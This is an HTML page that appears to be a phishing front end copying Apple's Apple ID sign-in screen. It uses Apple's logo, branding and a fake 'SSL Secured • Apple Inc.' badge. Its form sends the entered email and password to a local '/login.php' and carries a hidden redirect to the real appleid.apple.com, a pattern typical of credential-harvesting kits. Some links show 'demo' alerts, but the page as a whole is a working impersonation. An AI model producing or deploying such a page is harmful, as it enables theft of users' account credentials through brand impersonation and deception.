<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 18px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo svg {
            width: 50px;
            height: 50px;
            fill: #000;
            margin-bottom: 10px;
        }
        
        .logo h1 {
            font-size: 28px;
            font-weight: 600;
            color: #1d1d1f;
        }
        
        .logo p {
            color: #86868b;
            font-size: 14px;
            margin-top: 8px;
        }
        
        .card form {
            display: flex;
            flex-direction: column;
        }
        
        .card input {
            height: 52px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 16px;
            padding: 0 16px;
            margin-bottom: 16px;
            transition: all 0.2s;
        }
        
        .card input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 3px rgba(0,113,227,0.1);
        }
        
        .card input::placeholder {
            color: #86868b;
        }
        
        .card button {
            background: #0071e3;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            height: 52px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: all 0.2s;
        }
        
        .card button:hover {
            background: #0077ed;
        }
        
        .forgot-row {
            display: flex;
            justify-content: flex-end;
            margin: 10px 0;
        }
        
        .forgot-row a {
            color: #0071e3;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-row a:hover {
            text-decoration: underline;
        }
        
        .divider {
            display: flex;
            align-items: center;
            color: #86868b;
            font-size: 12px;
            margin: 20px 0;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #d2d2d7;
        }
        
        .divider::before {
            margin-right: 12px;
        }
        
        .divider::after {
            margin-left: 12px;
        }
        
        .create-link {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #1d1d1f;
        }
        
        .create-link a {
            color: #0071e3;
            font-weight: 500;
            text-decoration: none;
        }
        
        .create-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #86868b;
        }
        
        .footer a {
            color: #515154;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            color: #0071e3;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 20px 0 0;
            font-size: 11px;
            color: #86868b;
            padding-top: 20px;
            border-top: 1px solid #d2d2d7;
        }
        
        @media (max-width: 450px) {
            .container {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Apple Logo SVG -->
            <svg viewBox="0 0 24 24">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2.01.76-3.27.82-1.31.07-2.3-1.23-3.14-2.46-1.72-2.39-3.03-6.75-1.27-9.69.87-1.46 2.43-2.38 4.12-2.41 1.29-.03 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.86M14.25 3.3c.72-.84 1.2-2.01 1.07-3.17-1.04.04-2.3.69-3.04 1.56-.67.78-1.25 2.01-1.09 3.2 1.15.09 2.33-.59 3.06-1.59z" fill="#000"/>
            </svg>
            <h1>Apple ID</h1>
            <p>Sign in to manage your Apple account</p>
        </div>
        
        <div class="card">
            <form method="POST" action="/login.php" id="loginForm">
                <input type="hidden" name="redirect" value="https://appleid.apple.com">
                
                <input type="text" name="email" placeholder="Apple ID (email)" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                
                <div class="forgot-row">
                    <a href="#" onclick="alert('Forgot Apple ID demo'); return false;">Forgot Apple ID or password?</a>
                </div>
                
                <button type="submit">Sign In</button>
            </form>
            
            <div class="divider">or</div>
            
            <div class="create-link">
                <a href="#" onclick="alert('Create Apple ID demo'); return false;">Create your Apple ID</a>
            </div>
            
            <div class="security-note">
                <span>🔒</span>
                <span>SSL Secured</span>
                <span>•</span>
                <span>Apple Inc.</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Terms demo'); return false;">Terms of Service</a>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy Policy</a>
            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            if (!email || !password) {
                e.preventDefault();
                alert('Please enter your Apple ID and password');
                return;
            }
            
            if (!email.includes('@')) {
                e.preventDefault();
                alert('Please enter a valid email address');
                return;
            }
        });
        
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#0071e3';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#d2d2d7';
                }
            });
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.querySelector('input[name="email"]').focus();
        });
    </script>
</body>
</html>
